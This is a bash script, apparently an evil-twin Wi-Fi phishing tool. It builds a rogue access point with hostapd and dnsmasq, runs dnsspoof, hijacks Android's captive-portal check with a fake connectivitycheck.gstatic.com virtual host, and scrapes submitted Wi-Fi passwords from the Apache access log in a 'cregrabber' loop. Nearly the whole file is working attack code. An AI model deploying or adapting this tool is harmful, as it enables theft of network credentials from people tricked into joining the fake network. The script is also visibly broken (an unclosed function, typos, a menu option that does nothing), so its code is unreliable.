

function phish(){
install_pack;
find_interface;
echo "The selected interface is ${interface}"
get_ssid;
hostapd_conf;
dnsmasq_conf;
addtoweb;
android_conf;
final_conf;
while true;do
cregrabber;
sleep 1s;
done
}


function install_pack(){
needed_package=(
	"hostapd"
	"dsniff"
	"dnsmasq"
	"apache2"
	)
not_installed=()
echo "The packages in use:"
for f in "${needed_package[@]}"
do
	echo $f
	
done
echo -e
echo -e
echo -e

for i in "${needed_package[@]}"
do
	echo -ne "   $i"
	status="$(dpkg-query -l $i  2>&1)";
	flag="$(echo $status | grep "no packages found")";
	if [[ `echo $status | grep "no packages found"` ]];then
		echo -e  "   ${RED}not installed${NC}"
		not_installed+=($i)		       		
	else
		echo -e "    ${GREEN}installed${NC}"
	fi
	sleep 0.5
done

if [ ${#not_installed[@]} -gt 0 ];then
	echo -e "INSTALLING THE PACKEGES"
	for i in "${not_installed[@]}"
	do
		sudo apt-get install $i;
	done
	echo "Installation Completed"
	tput reset
fi
}

function find_interface(){
	interface_list=();
	for i in $(ifconfig | cut -d ' ' -f1| tr ':' '\n' | awk NF)
	do
		interface_list+=("$i")
	done
	echo -e "AVAILABLE INTERFACES:"
	declare -i count=0;
	for i in "${interface_list[@]}"
	do
		echo -e "$count.  $i";
		count+=1;
	done
	echo -e "Select the interface number you want to select";
	read number
	if [ $number -gt ${#interface_list[@]} ];then
		echo -e  "${RED}ERROR${NC}";
		echo -e "The input must be in the range";
		find_interface
	else
		interface="${interface_list[$number]}"
	fi
}

#collect ssid from user
function get_ssid(){

echo -e
echo -e
echo -e
echo -e "Enter the ssid :"
read ssid;
}
#making hostap.conf
#_____________________________________________

function hostapd_conf(){
	if [[ -f "hostapd.conf" ]]
	then
		sudo rm "hostapd.conf"
		hostapd_conf
	else
		sudo touch hostapd.conf;
		echo -e "interface=${interface}" >> hostapd.conf;
		echo -e "ssid=${ssid}" >> hostapd.conf;
		echo -e "hw_mode=g" >> hostapd.conf;
		echo -e "channel=6" >> hostapd.conf;
		echo -e "macaddr_acl=0" >> hostapd.conf;
		echo -e "auth_algs=1" >> hostapd.conf;
		echo -e "ignore_broadcast_ssid=0" >> hostapd.conf;
		echo -e "hostapd.conf file ${GREEN}created${NC}"
		read -p "Press enter to continue"
	fi
}

#making dnsmasq.conf file
#_____________________________________________________
function dnsmasq_conf(){
	if [[ -f dnsmasq.conf ]]
	then
		sudo rm "dnsmasq.conf"
		dnsmasq_conf
	else
		sudo touch dnsmasq.conf;
		echo -e "interface=${interface}" >> dnsmasq.conf
		echo  -e "dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h" >> dnsmasq.conf
		echo -e "dhcp-option=3,10.0.0.1" >> dnsmasq.conf
		echo -e "dhcp-option=6,10.0.0.1" >> dnsmasq.conf
		echo -e "server=8.8.8.8" >> dnsmasq.conf
		echo -e "log-queries" >> dnsmasq.conf
		echo -e "listen-address=127.0.0.1" >> dnsmasq.conf
		echo -e "dnsmasq.conf file ${GREEN}created${NC}"
		read -p "Press enter to continue"
	fi
}

#adding files needed to webserver
function addtoweb(){
	sleep 2;
	echo -e "Copying the files";
	sudo rm -rf /var/www/html/*;
	sudo cp -R project-files-main/windows project-files-main/android /var/www/html;
	sudo cp project-files-main/* /var/www/html 2>/dev/null;
	echo -e "Copying completed"
	read -p "ENTER TO CONTINUE";
}

#adding android conf files
function android_conf(){
	if [[ -f /etc/apache2/sites-enabled/android.conf ]];
	then
		echo "file found"
	else
		touch /etc/apache2/sites-enabled/android.conf;
		echo -e "<VirtualHost *:80>" >> /etc/apache2/sites-enabled/android.conf
		echo -e "Servername connectivitycheck.gstatic.com" >> /etc/apache2/sites-enabled/android.conf 
		echo -e "ServerAdmin webmaster@localhost" >> /etc/apache2/sites-enabled/android.conf 
		echo -e "DocumentRoot /var/www/html/android" >> /etc/apache2/sites-enabled/android.conf 
		echo -e "RedirectMatch 302 /generate_204 /index.html" >> /etc/apache2/sites-enabled/android.conf 
		echo -e "ErrorLog \${APACHE_LOG_DIR}/android_error.log" >> /etc/apache2/sites-enabled/android.conf 
		echo -e "CustomLog \${APACHE_LOG_DIR}/android_access.log combined" >> /etc/apache2/sites-enabled/android.conf 
		echo -e "</VirtualHost>" >> /etc/apache2/sites-enabled/android.conf 
		sleep 2;
		echo -e "Configuration files are set";
		read -p "Enter to continue";
	fi
}


function final_conf(){
	#disconnect from network
	tput reset
	echo -e "Attempting to disconnect from the network";
	sudo nmcli d disconnect wlan0;
	killall NerworkManager;
	sleep 2;
	xterm -e /bin/bash -l -c "hostapd hostapd.conf;bash" &
	sudo ifconfig wlan0 10.0.0.1; 
	xterm -e /bin/bash -l -c "dnsmasq -C dnsmasq.conf -d;bash" &
	echo 0 > /proc/sys/net/ipv4/ip_forward;
	a2enmod rewrite;	
	sleep 2;
	service apache2 start;
	xterm -e /bin/bash -l -c "dnsspoof -i wlan0;bash" &
}
function cregrabber(){
	tput reset
	s="$(grep "GET /connect.php?" /var/log/apache2/access.log | tail -1)"
	f="$(echo $s | cut -d " " -f 7)"

        QUERY="$(echo $f | cut -d "?" -f2)"
        IFS="&"
        set -- $QUERY
        pass1="$(echo $1 | cut -d "=" -f2)"
        pass2="$(echo $2 | cut -d "=" -f2)"
        printf "\r\t\t\t\t$pass1"
	echo " "
	echo " "
	echo "                    The password is:"
	#tail -f /var/log/apache2/acces                                                                                              
#initialization
#colours
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'



echo -e "\t \t \tthis is ${RED}WIFI-CRACKING${NC}"
echo -e
echo -e

echo "WHAT YOU LIKE TO DO TODAY?"
echo "1.WIFI Bruteforcing"
echo "2.WIFI Phishing"

echo "ENTER THE WANTED OPTION";read a;
case "$a" in
"1")
    echo "SELECTED BRUTEFORCING"
    ;;
"2")
    echo "SELECTED AETA";
    get_ssid;
    ;;
*)
    echo "Invalid option"
    ;;
esac

echo"hi"
